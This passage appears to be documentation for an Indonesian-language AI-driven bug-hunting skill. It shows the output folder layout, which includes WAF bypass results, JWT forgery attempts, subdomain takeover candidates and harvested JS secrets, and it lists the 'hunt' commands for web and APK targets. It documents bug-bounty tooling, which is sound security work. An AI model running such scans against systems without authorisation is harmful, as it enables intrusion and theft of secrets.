├── Laporan-BugHunter-[Target]-[Tanggal].docx    ← SATU dokumen Word final terpadu
├── watch-dashboard.html                          ← Live dashboard (saat watch mode)
└── pendukung/
    ├── ai/
    │   ├── triage.json                          ← Single source of truth
    │   ├── triage-prev.json                     ← Watch diff snapshot
    │   ├── audit-log.jsonl                      ← Jejak eksekusi kronologis
    │   └── generated-cases.md                   ← Daftar seluruh skenario uji
    ├── bukti/
    │   ├── network/                             ← HTTP flow capture
    │   ├── jwt/                                 ← Decoded JWT + forge attempts
    │   ├── oauth/                               ← OAuth flow captures
    │   ├── blind/                               ← Canary callback logs
    │   └── screenshots/                         ← Screenshot PoC tertanam di DOCX
    └── reconnaissance/
        ├── subdomains.json                      ← Subdomain enum + brute-force
        ├── subdomain-takeover.json              ← Takeover candidates
        ├── tech-fingerprint.json                ← Server/framework/CDN detection
        ├── endpoints.json                       ← Peta endpoint teridentifikasi
        ├── js-secrets.json                      ← Secrets dari JS file analysis
        ├── cve-matches.json                     ← CVE lookup hasil
        ├── graphql-schema.json                  ← Introspection schema
        ├── waf-analysis.json                    ← WAF type + bypass results
        ├── cache-poisoning.json                 ← Cache probe results
        └── api-versions.json                    ← Deprecated API endpoints
```

---

## 6. PERINTAH LENGKAP

```bash
# Hunt web penuh
hunt web https://target.com/

# Hunt APK
hunt apk com.target.app
hunt apk /path/to/app.apk

# Hunt hybrid
hunt all https://target.com/ com.target.app

# Watch mode 30 menit
hunt --watch 30 https://target.com/

# Alias
bughunt https://target.com/
```

Generator laporan:
```bash
python "%USERPROFILE%\.config\opencode\skills\bug-hunter\build_report.py" --root <folder_hasil>
```
